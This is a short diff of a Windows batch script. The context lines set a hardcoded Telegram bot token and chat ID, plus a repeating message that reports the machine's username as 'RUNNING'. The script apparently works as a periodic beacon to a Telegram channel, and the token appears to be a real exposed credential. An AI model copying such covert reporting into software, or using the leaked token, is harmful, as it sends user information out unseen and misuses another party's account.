@@ -427,6 +427,13 @@ echo Operation completed.
 
 
 
+
+
+
+
+
+
+
 set "LAST_MIN_SENT_FILE=%temp%\lstminsnt.txt"
 
 
@@ -461,7 +468,7 @@ if "%LAST_MINUTE%"=="%currentMinute1%" (
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%|RUNNING.....|"
+set "MESSAGEEVERY=%USERNAME%|RUNNING...............|"
 
 
 :: URL encode the message by replacing spaces with %20
